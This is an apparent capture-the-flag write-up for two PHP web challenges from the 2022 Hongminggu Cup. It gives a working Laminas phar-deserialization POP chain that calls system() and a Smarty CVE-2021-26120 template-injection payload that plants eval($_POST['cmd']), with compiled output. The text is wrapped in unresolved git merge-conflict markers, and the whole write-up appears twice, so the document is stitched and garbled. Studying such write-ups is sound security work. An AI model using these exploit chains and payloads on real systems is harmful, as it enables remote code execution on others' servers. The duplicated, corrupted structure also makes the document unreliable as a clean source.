<<<<<<<<< HEAD
# PHP competition study—2022 Hongminggu Cup

Author: H3rmesk1t

Data: 2022.03.22

# Fan website
## Question analysis
Visit the `Question link/www.zip` to get the source code of the question. Since the question gives the `Lamines component development`, we searched and found the relevant utilization article [Zend-Framework-unserialize-pop-chain](https://www.mrkaixin.top/posts/7e504798/#2-Lamines%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE). Let’s briefly follow the chain in the question. The ultimate goal is to implement file writing, and then use the `phar` protocol to trigger deserialization. First, search for the starting point of the deserialization vulnerability globally.

<div align=center><img src="./images/1.png"></div>

Follow up `laminas\laminas-log\src\Logger.php`, the `$this->writers` here is controllable. Then you need to find a class that implements the `shutdown` method, analyze the available methods and follow up `laminas\laminas-log\src\Writer\Mail.php`.

<div align=center><img src="./images/2.png"></div>

<div align=center><img src="./images/3.png"></div>

<div align=center><img src="./images/4.png"></div>

Since the `setBody` method is not called in other functions, you can use this to trigger the `__call` method and follow up to `laminas\laminas-view\src\Renderer\PhpRenderer.php`. Here you will further call the `plugin` method. When `$__helpers` is set, the `$this->__helpers->get` method will be called, and here you assign it to `laminas\laminas-view\src\Resolver\TemplateMapResolver.php`.

<div align=center><img src="./images/5.png"></div>

Follow up on the `laminas\laminas-view\src\Resolver\TemplateMapResolver.php` method. Here, use `$this->map[$name]` to assign the previous `setBody` to `system` and other commands to execute functions, so as to return to the previous `__call` method and continue to call `call_user_func_array` to execute the command.

<div align=center><img src="./images/6.png"></div>

In the title, the route uploaded and deleted routes are given, and the `unlink` method will be called in the deletion method, which will use this to trigger the `phar` protocol.

<div align=center><img src="./images/7.png"></div>

## Vulnerability Exploit
It should be noted that in the upload routing method, the `__HALT_COMPILER` feature detection needs to be bypassed, and the file suffix name will be detected, so the `phar` file suffix needs to be changed to `png`, etc.

```php
<?php
	namespace Laminas\Log {
		
		class Logger {
			
			protected $writers;
			function __construct(){
				$this->writers = [new \Laminas\Log\Writer\Mail()];
			}
		}
	}

	namespace Laminas\Log\Writer {
		
		abstract class AbstractWriter {}
		
		class Mail extends AbstractWriter {

			protected $eventsToMail = ["ls /; cat flag"];
			protected $subjectPrependText = null;
			protected $mail;
			function __construct(){
				$this->mail = new \Laminas\View\Renderer\PhpRenderer();
			}
		}
	}

	namespace Laminas\View\Renderer {

		class PhpRenderer {

			private $__helpers;
			function __construct() {

				$this->__helpers = new \Laminas\View\Resolver\TemplateMapResolver();
			}
		}
	}

	namespace Laminas\View\Resolver{

		class TemplateMapResolver{

			protected $map = ["setBody"=>"system"];
		}
	}


	namespace {

	    $phar = new Phar("phar.phar");
	    $phar->startBuffering();
	    $phar->setStub("<?php __HALT_COMPILER(); ?>");
	    $object = new \Laminas\Log\Logger();
	    $phar->setMetadata($object);
	    $phar->addFromString("h3rmesk1t.txt", "h3rmesk1t");
	    $phar->stopBuffering();
	}
?>
```

Then use the modified file to access `http://eci-2zehsthmgb5z68m80j4g.cloudeci1.icunqiu.com/album/imgupload` to upload the file, then access `http://eci-2zehsthmgb5z68m80j4g.cloudeci1.icunqiu.com/album/imgdelete`, and enter `/var/www/public/img/59901a7488e9011cd161f102d9430895.png` to trigger the vulnerability.

<div align=center><img src="./images/8.png"></div>

# Smarty_calculator
## Question analysis
I still visited the question link/www.zip to get the question source code, added `Cookie: login=1` and `POST {$smarty.version}`, and successfully got the version information. Since the question said that the developer modified the template rules themselves, I pulled `Smarty 3.1.39` here for comparison, and found that the regular rules were modified.

<div align=center><img src="./images/9.png"></div>

<div align=center><img src="./images/10.png"></div>

<div align=center><img src="./images/11.png"></div>

After searching for the question information, I found that there are vulnerabilities that can be exploited. The `Smarty_Internal_Runtime_TplFunction`Sandbox Escape`PHP` code injection vulnerability (CVE-2021-26120), refer to [GitHub Update](https://github.com/smarty-php/smarty/commit/290aee6db33403a4b9426b572b79a990232b31dd).

Since the `Smarty` class cannot correctly filter the `name` attribute `tplFunctions` when compiling the template syntax, the `Smarty_Internal_Runtime_TplFunction` class when defining cannot correctly filter the `name`attacker can execute code remotely by injecting `Payload`.

<div align=center><img src="./images/12.png"></div>

But this vulnerability is different from this vulnerability, and it needs to be bypassed. First, just `POST` one data is `data={function name='(){};'}{/function}`

```php
<?php
/* Smarty version 3.1.39, created on 2022-03-22 23:35:26
  from 'cca2ce857d642a4c0875c01a8508fdfe6fb1889f' */

/* @var Smarty_Internal_Template $_smarty_tpl */
if ($_smarty_tpl->_decodeProperties($_smarty_tpl, array (
  'version' => '3.1.39',
  'unifunc' => 'content_6239ecbe814d21_96774455',
  'has_nocache_code' => false,
  'file_dep
endency' =>
  array (
  ),
  'includes' =>
  array (
  ),
),false)) {
function content_6239ecbe814d21_96774455 (Smarty_Internal_Template $_smarty_tpl) {
$_smarty_tpl->smarty->ext->_tplFunction->registerTplFunctions($_smarty_tpl, array (
  '(){};' =>
  array (
    'compiled_filepath' => 'C:\\Tools\\phpstudy_pro\\WWW\\html\\templates_c\\cca2ce857d642a4c0875c01a8508fdfe6fb1889f_0.string.php',
    'uid' => 'cca2ce857d642a4c0875c01a8508fdfe6fb1889f',
    'call_name' => 'smarty_template_function_(){};_18679747696239ecbe74eee5_05027020',
  ),
));
}
/* smarty_template_function_(){};_18679747696239ecbe74eee5_05027020 */
if (!function_exists('smarty_template_function_(){};_18679747696239ecbe74eee5_05027020')) {
function smarty_template_function_(){};_18679747696239ecbe74eee5_05027020(Smarty_Internal_Template $_smarty_tpl,$params) {
foreach ($params as $key => $value) {
$_smarty_tpl->tpl_vars[$key] = new Smarty_Variable($value, $_smarty_tpl->isRenderingCache);
}
}}
/*/ smarty_template_function_(){};_18679747696239ecbe74eee5_05027020 */
}
```

According to the generated content format, it is not difficult to construct a malicious bypass `Payload`: `data={function name='(){};/*";}/*'}*/eval($_POST['cmd']);"}{/function}&cmd=phpinfo();`. You can see that the generated cache template function is successfully closed perfectly.

```php
<?php
/* Smarty version 3.1.39, created on 2022-03-22 23:45:24
  from 'c16d407db4adb2d55529d8d5521a1a1585555d84' */

/* @var Smarty_Internal_Template $_smarty_tpl */
if ($_smarty_tpl->_decodeProperties($_smarty_tpl, array (
  'version' => '3.1.39',
  'unifunc' => 'content_6239ef14a8b872_01812683',
  'has_nocache_code' => false,
  'file_dependency' =>
  array (
  ),
  'includes' =>
  array (
  ),
),false)) {
function content_6239ef14a8b872_01812683 (Smarty_Internal_Template $_smarty_tpl) {
$_smarty_tpl->smarty->ext->_tplFunction->registerTplFunctions($_smarty_tpl, array (
  '(){};/*";}/*' =>
  array (
    'compiled_filepath' => 'C:\\Tools\\phpstudy_pro\\WWW\\html\\templates_c\\c16d407db4adb2d55529d8d5521a1a1585555d84_0.string.php',
    'uid' => 'c16d407db4adb2d55529d8d5521a1a1585555d84',
    'call_name' => 'smarty_template_function_(){};/*";}/*_12721005126239ef14989679_11892413',
  ),
));
}
/* smarty_template_function_(){};/*";}/*_12721005126239ef14989679_11892413 */
if (!function_exists('smarty_template_function_(){};/*";}/*_12721005126239ef14989679_11892413')) {
function smarty_template_function_(){};/*";}/*_12721005126239ef14989679_11892413(Smarty_Internal_Template $_smarty_tpl,$params) {
foreach ($params as $key => $value) {
$_smarty_tpl->tpl_vars[$key] = new Smarty_Variable($value, $_smarty_tpl->isRenderingCache);
}
?>
*/eval($_POST['cmd']);"}<?php
}}
/*/ smarty_template_function_(){};/*";}/*_12721005126239ef14989679_11892413 */
}
```

========
# PHP competition study—2022 Hongminggu Cup

Author: H3rmesk1t

Data: 2022.03.22

# Fan website
## Question analysis
Visit the `Question link/www.zip` to get the source code of the question. Since the question gives the `Lamines component development`, we searched and found the relevant utilization article [Zend-Framework-unserialize-pop-chain](https://www.mrkaixin.top/posts/7e504798/#2-Lamines%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE). Let’s briefly follow the chain in the question. The ultimate goal is to implement file writing, and then use the `phar` protocol to trigger deserialization. First, search for the starting point of the deserialization vulnerability globally.

<div align=center><img src="./images/1.png"></div>

Follow up `laminas\laminas-log\src\Logger.php`, the `$this->writers` here is controllable. Then you need to find a class that implements the `shutdown` method, analyze the available methods and follow up `laminas\laminas-log\src\Writer\Mail.php`.

<div align=center><img src="./images/2.png"></div>

<div align=center><img src="./images/3.png"></div>

<div align=center><img src="./images/4.png"></div>

Since the `setBody` method is not called in other functions, you can use this to trigger the `__call` method and follow up to `laminas\laminas-view\src\Renderer\PhpRenderer.php`. Here you will further call the `plugin` method. When `$__helpers` is set, the `$this->__helpers->get` method will be called, and here you assign it to `laminas\laminas-view\src\Resolver\TemplateMapResolver.php`.

<div align=center><img src="./images/5.png"></div>

Follow up on the `laminas\laminas-view\src\Resolver\TemplateMapResolver.php` method. Here, use `$this->map[$name]` to assign the previous `setBody` to `system` and other commands to execute functions, so as to return to the previous `__call` method and continue to call `call_user_func_array` to execute the command.

<div align=center><img src="./images/6.png"></div>

In the title, the route uploaded and deleted routes are given, and the `unlink` method will be called in the deletion method, which will use this to trigger the `phar` protocol.

<div align=center><im
g src="./images/7.png"></div>

## Vulnerability Exploit
It should be noted that in the upload routing method, the `__HALT_COMPILER` feature detection needs to be bypassed, and the file suffix name will be detected, so the `phar` file suffix needs to be changed to `png`, etc.

```php
<?php
	namespace Laminas\Log {
		
		class Logger {
			
			protected $writers;
			function __construct(){
				$this->writers = [new \Laminas\Log\Writer\Mail()];
			}
		}
	}

	namespace Laminas\Log\Writer {
		
		abstract class AbstractWriter {}
		
		class Mail extends AbstractWriter {

			protected $eventsToMail = ["ls /; cat flag"];
			protected $subjectPrependText = null;
			protected $mail;
			function __construct(){
				$this->mail = new \Laminas\View\Renderer\PhpRenderer();
			}
		}
	}

	namespace Laminas\View\Renderer {

		class PhpRenderer {

			private $__helpers;
			function __construct() {

				$this->__helpers = new \Laminas\View\Resolver\TemplateMapResolver();
			}
		}
	}

	namespace Laminas\View\Resolver{

		class TemplateMapResolver{

			protected $map = ["setBody"=>"system"];
		}
	}


	namespace {

	    $phar = new Phar("phar.phar");
	    $phar->startBuffering();
	    $phar->setStub("<?php __HALT_COMPILER(); ?>");
	    $object = new \Laminas\Log\Logger();
	    $phar->setMetadata($object);
	    $phar->addFromString("h3rmesk1t.txt", "h3rmesk1t");
	    $phar->stopBuffering();
	}
?>
```

Then use the modified file to access `http://eci-2zehsthmgb5z68m80j4g.cloudeci1.icunqiu.com/album/imgupload` to upload the file, then access `http://eci-2zehsthmgb5z68m80j4g.cloudeci1.icunqiu.com/album/imgdelete`, and enter `/var/www/public/img/59901a7488e9011cd161f102d9430895.png` to trigger the vulnerability.

<div align=center><img src="./images/8.png"></div>

# Smarty_calculator
## Question analysis
I still visited the question link/www.zip to get the question source code, added `Cookie: login=1` and `POST {$smarty.version}`, and successfully got the version information. Since the question said that the developer modified the template rules themselves, I pulled `Smarty 3.1.39` here for comparison, and found that the regular rules were modified.

<div align=center><img src="./images/9.png"></div>

<div align=center><img src="./images/10.png"></div>

<div align=center><img src="./images/11.png"></div>

After searching for the question information, I found that there are vulnerabilities that can be exploited. The `Smarty_Internal_Runtime_TplFunction`Sandbox Escape`PHP` code injection vulnerability (CVE-2021-26120), refer to [GitHub Update](https://github.com/smarty-php/smarty/commit/290aee6db33403a4b9426b572b79a990232b31dd).

Since the `Smarty` class cannot correctly filter the `name` attribute `tplFunctions` when compiling the template syntax, the `Smarty_Internal_Runtime_TplFunction` class when defining cannot correctly filter the `name`attacker can execute code remotely by injecting `Payload`.

<div align=center><img src="./images/12.png"></div>

But this vulnerability is different from this vulnerability, and it needs to be bypassed. First, just `POST` one data is `data={function name='(){};'}{/function}`

```php
<?php
/* Smarty version 3.1.39, created on 2022-03-22 23:35:26
  from 'cca2ce857d642a4c0875c01a8508fdfe6fb1889f' */

/* @var Smarty_Internal_Template $_smarty_tpl */
if ($_smarty_tpl->_decodeProperties($_smarty_tpl, array (
  'version' => '3.1.39',
  'unifunc' => 'content_6239ecbe814d21_96774455',
  'has_nocache_code' => false,
  'file_dependency' =>
  array (
  ),
  'includes' =>
  array (
  ),
),false)) {
function content_6239ecbe814d21_96774455 (Smarty_Internal_Template $_smarty_tpl) {
$_smarty_tpl->smarty->ext->_tplFunction->registerTplFunctions($_smarty_tpl, array (
  '(){};' =>
  array (
    'compiled_filepath' => 'C:\\Tools\\phpstudy_pro\\WWW\\html\\templates_c\\cca2ce857d642a4c0875c01a8508fdfe6fb1889f_0.string.php',
    'uid' => 'cca2ce857d642a4c0875c01a8508fdfe6fb1889f',
    'call_name' => 'smarty_template_function_(){};_18679747696239ecbe74eee5_05027020',
  ),
));
}
/* smarty_template_function_(){};_18679747696239ecbe74eee5_05027020 */
if (!function_exists('smarty_template_function_(){};_18679747696239ecbe74eee5_05027020')) {
function smarty_template_function_(){};_18679747696239ecbe74eee5_05027020(Smarty_Internal_Template $_smarty_tpl,$params) {
foreach ($params as $key => $value) {
$_smarty_tpl->tpl_vars[$key] = new Smarty_Variable($value, $_smarty_tpl->isRenderingCache);
}
}}
/*/ smarty_template_function_(){};_18679747696239ecbe74eee5_05027020 */
}
```

According to the generated content format, it is not difficult to construct a malicious bypass `Payload`: `data={function name='(){};/*";}/*'}*/eval($_POST['cmd']);"}{/function}&cmd=phpinfo();`. You can see that the generated cache template function is successfully closed perfectly.

```php
<?php
/* Smarty version 3.1.39, created on 2022-03-22 23:45:24
  from 'c16d407db4adb2d55529d8d5521a1a1585555d84' */

/* @var Smarty_In
ternal_Template $_smarty_tpl */
if ($_smarty_tpl->_decodeProperties($_smarty_tpl, array (
  'version' => '3.1.39',
  'unifunc' => 'content_6239ef14a8b872_01812683',
  'has_nocache_code' => false,
  'file_dependency' =>
  array (
  ),
  'includes' =>
  array (
  ),
),false)) {
function content_6239ef14a8b872_01812683 (Smarty_Internal_Template $_smarty_tpl) {
$_smarty_tpl->smarty->ext->_tplFunction->registerTplFunctions($_smarty_tpl, array (
  '(){};/*";}/*' =>
  array (
    'compiled_filepath' => 'C:\\Tools\\phpstudy_pro\\WWW\\html\\templates_c\\c16d407db4adb2d55529d8d5521a1a1585555d84_0.string.php',
    'uid' => 'c16d407db4adb2d55529d8d5521a1a1585555d84',
    'call_name' => 'smarty_template_function_(){};/*";}/*_12721005126239ef14989679_11892413',
  ),
));
}
/* smarty_template_function_(){};/*";}/*_12721005126239ef14989679_11892413 */
if (!function_exists('smarty_template_function_(){};/*";}/*_12721005126239ef14989679_11892413')) {
function smarty_template_function_(){};/*";}/*_12721005126239ef14989679_11892413(Smarty_Internal_Template $_smarty_tpl,$params) {
foreach ($params as $key => $value) {
$_smarty_tpl->tpl_vars[$key] = new Smarty_Variable($value, $_smarty_tpl->isRenderingCache);
}
?>
*/eval($_POST['cmd']);"}<?php
}}
/*/ smarty_template_function_(){};/*";}/*_12721005126239ef14989679_11892413 */
}
```

>>>>>>> 8cafef977134ca4058458a57910f051e339a9dc1
<div align=center><img src="./images/13.png"></div>